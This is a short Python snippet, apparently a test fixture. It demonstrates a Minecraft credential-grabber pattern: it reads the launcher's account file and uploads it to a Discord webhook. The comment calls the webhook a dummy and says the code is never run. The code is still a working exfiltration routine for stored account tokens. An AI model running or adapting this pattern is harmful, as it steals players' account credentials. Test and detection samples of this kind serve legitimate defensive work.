# Python grabber shape: reads the vanilla launcher's account store and posts it to
# a Discord webhook. Dummy webhook; static test data, never run.
import requests

ACCOUNTS = ".minecraft/launcher_accounts.json"
with open(ACCOUNTS, "rb") as fh:
    requests.post("https://discord.com/api/webhooks/0/FIXTURE-NOT-A-REAL-WEBHOOK", files={"f": fh})
